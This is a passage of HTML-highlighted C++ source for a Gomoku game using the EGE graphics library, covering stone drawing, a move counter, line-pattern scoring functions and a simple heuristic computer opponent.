class="number">0</span>));</span><br><span class="line">xyprintf(<span class="number">10</span>, <span class="number">70</span>, <span class="string">&quot;黑: 0&quot;</span>);</span><br><span class="line">setcolor(EGERGB(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));</span><br><span class="line">xyprintf(<span class="number">10</span>, <span class="number">100</span>, <span class="string">&quot;白: 0&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Chess</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> color)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (color % <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">setcolor(EGERGB(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));</span><br><span class="line">setfillcolor(EGERGB(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));</span><br><span class="line">fillellipse(x, y, <span class="number">15</span>, <span class="number">15</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">setcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">setfillcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">fillellipse(x, y, <span class="number">15</span>, <span class="number">15</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Play</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> color)</span><span class="comment">//color: 0●  1○</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">x -= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (x &gt;= <span class="number">1</span> &amp;&amp; x &lt;= <span class="number">15</span> &amp;&amp; y &gt;= <span class="number">1</span> &amp;&amp; y &lt;= <span class="number">15</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!pos[x][y])</span><br><span class="line">&#123;</span><br><span class="line">Chess(x * <span class="number">40</span> + <span class="number">80</span>, y * <span class="number">40</span>, color);</span><br><span class="line"><span class="keyword">if</span> (color)pos[x][y] = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">else</span> pos[x][y] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Counter</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setfillcolor(EGERGB(<span class="number">199</span>, <span class="number">156</span>, <span class="number">124</span>));</span><br><span class="line">bar(<span class="number">50</span>, <span class="number">60</span>, <span class="number">70</span>, <span class="number">120</span>);</span><br><span class="line"><span class="keyword">if</span> (n % <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">setcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">xyprintf(<span class="number">50</span>, <span class="number">70</span>, <span class="string">&quot;%d&quot;</span>, (n + <span class="number">1</span>) / <span class="number">2</span>);</span><br><span class="line">setcolor(EGERGB(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));</span><br><span class="line">xyprintf(<span class="number">50</span>, <span class="number">100</span>, <span class="string">&quot;%d&quot;</span>, n / <span class="number">2</span>);</span><br><span class="line">bar(<span class="number">0</span>, <span class="number">140</span>, <span class="number">100</span>, <span class="number">180</span>);</span><br><span class="line">xyprintf(<span class="number">10</span>, <span class="number">150</span>, <span class="string">&quot;白方执棋&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">setcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">xyprintf(<span class="number">50</span>, <span class="number">70</span>, <span class="string">&quot;%d&quot;</span>, n / <span class="number">2</span>);</span><br><span class="line">setcolor(EGERGB(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));</span><br><span class="line">xyprintf(<span class="number">50</span>, <span class="number">100</span>, <span class="string">&quot;%d&quot;</span>, (n + <span class="number">1</span>) / <span class="number">2</span>);</span><br><span class="line">bar(<span class="number">0</span>, <span class="number">140</span>, <span class="number">100</span>, <span class="number">180</span>);</span><br><span class="line">setcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">xyprintf(<span class="number">10</span>, <span class="number">150</span>, <span class="string">&quot;黑方执棋&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">lian5</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>, flag1 = <span class="number">0</span>, flag2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">5</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]])</span><br><span class="line">ans++;</span><br><span class="line"><span class="keyword">else</span> flag1 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]])</span><br><span class="line">ans++;</span><br><span class="line"><span class="keyword">else</span> flag2 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ans &gt;= <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == <span class="number">1</span>)black[x][y] += <span class="number">100</span>;</span><br><span class="line"><span class="keyword">else</span> white[x][y] += <span class="number">100</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">live4</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>, a = <span class="number">1</span>, b = <span class="number">1</span>, flag1 = <span class="number">0</span>, flag2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">5</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]])</span><br><span class="line">ans++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">a = <span class="number">0</span>, flag1 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]])</span><br><span class="line">ans++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">b = <span class="number">0</span>, flag2 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((ans &gt;= <span class="number">3</span>) &amp;&amp; !a &amp;&amp; !b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == <span class="number">1</span>)black[x][y] += <span class="number">80</span>;</span><br><span class="line"><span class="keyword">else</span> white[x][y] += <span class="number">80</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">chong4</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>, a = <span class="number">1</span>, b = <span class="number">1</span>, flag1 = <span class="number">0</span>, flag2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">5</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]])</span><br><span class="line">ans++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">a = <span class="number">0</span>, flag1 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]])</span><br><span class="line">ans++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">b = <span class="number">0</span>, flag2 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((ans &gt;= <span class="number">3</span>) &amp;&amp; (a || b) &amp;&amp; (a != b))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == <span class="number">1</span>)black[x][y] += <span class="number">60</span>;</span><br><span class="line"><span class="keyword">else</span> white[x][y] += <span class="number">60</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">live3</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>, a = <span class="number">1</span>, b = <span class="number">1</span>, flag1 = <span class="number">0</span>, flag2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]])</span><br><span class="line">ans++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">a = <span class="number">0</span>, flag1 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]])</span><br><span class="line">ans++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">b = <span class="number">0</span>, flag2 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((ans &gt;= <span class="number">2</span>) &amp;&amp; !a &amp;&amp; !b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == <span class="number">1</span>)black[x][y] += <span class="number">70</span>;</span><br><span class="line"><span class="keyword">else</span> white[x][y] += <span class="number">70</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">death3</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>, a = <span class="number">1</span>, b = <span class="number">1</span>, flag1 = <span class="number">0</span>, flag2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]])</span><br><span class="line">ans++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">a = <span class="number">0</span>, flag1 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]])</span><br><span class="line">ans++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">b = <span class="number">0</span>, flag2 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((ans &gt;= <span class="number">2</span>) &amp;&amp; (a || b) &amp;&amp; (a != b))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == <span class="number">1</span>)black[x][y] += <span class="number">50</span>;</span><br><span class="line"><span class="keyword">else</span> white[x][y] += <span class="number">50</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">live2</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>, a = <span class="number">1</span>, b = <span class="number">1</span>, flag1 = <span class="number">0</span>, flag2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x + j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y + j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]])</span><br><span class="line">ans++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pos[x + j * dir[i][<span class="number">0</span>]][y + j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">a = <span class="number">0</span>, flag1 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]])</span><br><span class="line">ans++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">b = <span class="number">0</span>, flag2 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((ans &gt;= <span class="number">1</span>) &amp;&amp; !a &amp;&amp; !b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == <span class="number">1</span>)black[x][y] += <span class="number">40</span>;</span><br><span class="line"><span class="keyword">else</span> white[x][y] += <span class="number">40</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">death2</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>, a = <span class="number">1</span>, b = <span class="number">1</span>, flag1 = <span class="number">0</span>, flag2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!flag1 &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]])</span><br><span class="line">ans++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">a = <span class="number">0</span>, flag1 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &gt; <span class="number">0</span>) &amp;&amp; (x - j * dir[i][<span class="number">0</span>] &lt; <span class="number">16</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &gt; <span class="number">0</span>) &amp;&amp; (y - j * dir[i][<span class="number">1</span>] &lt; <span class="number">16</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]])</span><br><span class="line">ans++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pos[x - j * dir[i][<span class="number">0</span>]][y - j * dir[i][<span class="number">1</span>]] == <span class="number">0</span>)</span><br><span class="line">b = <span class="number">0</span>, flag2 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((ans &gt;= <span class="number">1</span>) &amp;&amp; (a || b) &amp;&amp; (a != b))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[x][y] == <span class="number">1</span>)black[x][y] += <span class="number">30</span>;</span><br><span class="line"><span class="keyword">else</span> white[x][y] += <span class="number">30</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AI</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> b_x = <span class="number">8</span>, b_y = <span class="number">8</span>, w_x = <span class="number">8</span>, w_y = <span class="number">8</span>;</span><br><span class="line"><span class="built_in">memset</span>(black, <span class="number">0</span>, <span class="keyword">sizeof</span>(black));</span><br><span class="line"><span class="built_in">memset</span>(white, <span class="number">0</span>, <span class="keyword">sizeof</span>(white));</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">15</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">15</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!pos[i][j])</span><br><span class="line">&#123;</span><br><span class="line">pos[i][j] = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (lian5(i, j))<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (live4(i, j))<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (live3(i, j))<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (chong4(i, j))<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (death3(i, j))<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (live2(i, j))<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (death2(i, j))<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pos[i][j] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (lian5(i, j))<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (live4(i, j))<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (live3(i, j))<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (chong4(i, j))<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (death3(i, j))<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (live2(i, j))<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (death2(i, j))<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pos[i][j] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (black[i][j] &gt; black[b_x][b_y])b_x = i, b_y = j;</span><br><span class="line"><span class="keyword">if</span> (white[i][j] &gt; white[w_x][w_y])w_x = i, w_y = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">Sleep(<span class="number">1000</span>);</span><br><span class="line"><span class="keyword">if</span> (black[b_x][b_y] &lt;= white[w_x][w_y])Play(w_x + <span class="number">2</span>, w_y, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">else</span> Play(b_x + <span class="number">2</span>, b_y, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GameAI</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span 